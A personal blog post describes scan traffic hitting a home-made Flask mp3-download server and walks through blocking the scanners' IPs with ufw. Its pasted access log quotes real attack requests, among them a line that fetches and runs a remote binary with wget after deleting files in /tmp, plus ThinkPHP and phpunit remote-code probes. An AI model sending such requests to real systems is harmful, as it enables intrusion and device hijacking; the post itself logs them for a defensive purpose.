I ran a simple Python webserver to host mp3 files that my mom asked me to download from Youtube the other day.
Yep, I am technically the technical support of anything tech in the family. She sometimes found a good song on Youtube and would want an mp3 of it.

I wrote a simple web service using Python and Flask and let her supply the Youtube link to it, and it will download the mp3 for her - Thanks youtube-dl!

However, being the cheapskate that I am, I'm running this server on 1GB RAM. So that simple task, unfortunately, take a few minutes to complete.
Therefore, I fire up a simple web server for her to download the processed mp3 later.

I log all the requests coming to the web server to a file. As you can see below, it seemed that my server is always being scanned.
<pre>
188.153.229.155 - - [04/Mar/2022 07:31:51] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1')
188.153.229.155 - - [04/Mar/2022 07:31:51] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1" 400 -
45.146.165.37 - - [04/Mar/2022 11:10:12] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
45.146.165.37 - - [04/Mar/2022 11:59:10] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 -
5.129.3.8 - - [04/Mar/2022 12:29:46] "GET /.well-known/assetlinks.json HTTP/1.1" 302 -
5.129.3.8 - - [04/Mar/2022 12:29:51] "GET /.well-known/assetlinks.json HTTP/1.1" 302 -
34.229.145.138 - - [04/Mar/2022 12:30:24] "GET /app-ads.txt HTTP/1.1" 302 -
92.39.215.63 - - [04/Mar/2022 12:32:40] "GET /.well-known/assetlinks.json HTTP/1.1" 302 -
178.214.251.62 - - [04/Mar/2022 12:32:44] "GET /.well-known/assetlinks.json HTTP/1.1" 302 -
45.146.165.37 - - [04/Mar/2022 12:48:48] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 302 -
107.175.87.164 - - [04/Mar/2022 13:14:59] "POST /boaform/admin/formLogin HTTP/1.1" 501 -
66.249.89.4 - - [04/Mar/2022 13:29:22] "GET /feeds/posts/default HTTP/1.1" 302 -
45.146.165.37 - - [04/Mar/2022 13:42:45] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
45.137.23.152 - - [04/Mar/2022 14:55:11] "GET /doc/script/lib/seajs/config/sea-config.js HTTP/1.1" 302 -
45.146.165.37 - - [04/Mar/2022 15:03:13] code 501, message Unsupported method ('POST')
45.146.165.37 - - [04/Mar/2022 15:03:13] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 501 -
34.86.35.15 - - [04/Mar/2022 15:34:33] code 400, message Bad request version ('À(À$À\x14À')
34.86.35.15 - - [04/Mar/2022 15:34:33] "ÊÆãq~Ãk~8aP»®¥4@V4xü>ãfWhÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ     À(À$ÀÀ" 400 -
</pre>
And I checked Upcloud's (my cloud provider) firewall package. Unfortunately, it will cost me $4.03 per month / $0.0056 per hour just to get the firewall running. Yikes!

So I decided to enable the firewall on the server itself. So let us just block those IPs.

First, I have to get the list of IPs into a file. I assumed no natural person visited my site yesterday.
So I quickly run a quick command just to get the IPs.

<pre>
cat log.txt | cut -d" " -f1 | sort | uniq -c | awk '{print $2}' > log_ip.txt
</pre>

So I have something like this.

<pre>
45.146.165.37
45.155.126.211
45.87.61.162
51.222.253.13
51.222.253.9
...
66.249.89.2
66.249.89.31
66.249.89.4
81.38.99.77
82.84.179.154
89.187.182.24
92.39.215.63
</pre>

Now, it's time to enable the firewall.
First, get it installed.

<pre>
sudo apt update
sudo apt install ufw
</pre>

Then, check if it's running. It should be disabled by default.
<pre>
sudo ufw status verbose
</pre>

Next, I add some rules that allow my applications and services to listen to certain ports
<pre>
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 8000/tcp
sudo ufw allow 8080/tcp
sudo ufw allow 3306/tcp
sudo ufw allow 443/tcp
</pre>

Then, it is time to enable the firewall
<pre>
sudo ufw enable
sudo ufw status verbose
</pre>

It will show the current configuration, which looks like something like this.

<pre>
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere
80/tcp                     ALLOW IN    Anywhere
8000/tcp                   ALLOW IN    Anywhere
8080/tcp                   ALLOW IN    Anywhere
3306/tcp                   ALLOW IN    Anywhere
443/tcp                    ALLOW IN    Anywhere
22/tcp (v6)                ALLOW IN    Anywhere (v6)
80/tcp (v6)                ALLOW IN    Anywhere (v6)
8000/tcp (v6)              ALLOW IN    Anywhere (v6)
8080/tcp (v6)              ALLOW IN    Anywhere (v6)
3306/tcp (v6)              ALLOW IN    Anywhere (v6)
443/tcp (v6)               ALLOW IN    Anywhere (v6)
</pre>

Now, I ran a simple loop to add the list of IPs before to the "ban" list.
<pre>
while read line; do sudo ufw insert 1 deny from $line to any; done < log_ip.txt
</pre>

That will give you something like this
<pre>
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
Anywhere                   DENY IN     34.86.35.15
Anywhere                   DENY IN     128.14.141.34
Anywhere                   DENY IN     176.107.23.166
Anywhere                   DENY IN     124.206.180.139
....
</pre>

To check if this works, see the UFW log files
<pre>
sudo less /var/log/ufw.log
</pre>

You should be able to see something like this
<pre>
ar  5 05:52:46 kemaman kernel: [3519702.189354] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=57458 DF PROTO=TCP SPT=41831 DPT=34426 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:46 kemaman kernel: [3519702.254407] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=35403 DF PROTO=TCP SPT=40709 DPT=16304 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:46 kemaman kernel: [3519702.344754] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=1862 DF PROTO=TCP SPT=16234 DPT=53181 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:47 kemaman kernel: [3519702.993538] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=56444 DF PROTO=TCP SPT=40709 DPT=16305 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:47 kemaman kernel: [3519703.018882] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=36868 DF PROTO=TCP SPT=16234 DPT=53182 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:47 kemaman kernel: [3519703.213572] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=1383 DF PROTO=TCP SPT=41831 DPT=34427 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:48 kemaman kernel: [3519703.887525] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=28004 DF PROTO=TCP SPT=16234 DPT=53183 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:48 kemaman kernel: [3519704.229145] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=35890 DF PROTO=TCP SPT=41831 DPT=34428 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:48 kemaman kernel: [3519704.266641] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=14878 DF PROTO=TCP SPT=40709 DPT=16306 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:49 kemaman kernel: [3519705.166388] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=79.124.62.86 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=235 ID=2928 PROTO=TCP SPT=47144 DPT=20290 WINDOW=1024 RES=0x00 SYN URGP=0
Mar  5 05:52:49 kemaman kernel: [3519705.195344] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=241 ID=35627 DF PROTO=TCP SPT=16234 DPT=53184 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:49 kemaman kernel: [3519705.253392] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=59670 DF PROTO=TCP SPT=41831 DPT=34429 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:49 kemaman kernel: [3519705.324782] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=40991 DF PROTO=TCP SPT=40709 DPT=16307 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:50 kemaman kernel: [3519705.947431] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=154.198.193.133 DST=94.237.78.193 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID=0 DF PROTO=TCP SPT=47369 DPT=6379 WINDOW=1024 RES=0x00 SYN URGP=0
Mar  5 05:52:50 kemaman kernel: [3519706.239341] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=21826 DF PROTO=TCP SPT=16234 DPT=53185 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:50 kemaman kernel: [3519706.372121] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=23077 DF PROTO=TCP SPT=41831 DPT=34430 WINDOW=512 RES=0x00 SYN URGP=0
Mar  5 05:52:50 kemaman kernel: [3519706.494910] [UFW BLOCK] IN=eth0 OUT= MAC=b2:5c:a8:86:1d:71:9a:7e:00:3b:09:c7:08:00 SRC=103.89.91.231 DST=94.237.78.193 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=24427 DF PROTO=TCP SPT=40709 DPT=16308 WINDOW=512 RES=0x00 SYN URGP=0
</pre>

That's it! It might not be the best practice, and I probably wasted some resources just to run it.

Also, talking about adding new IPs later on....
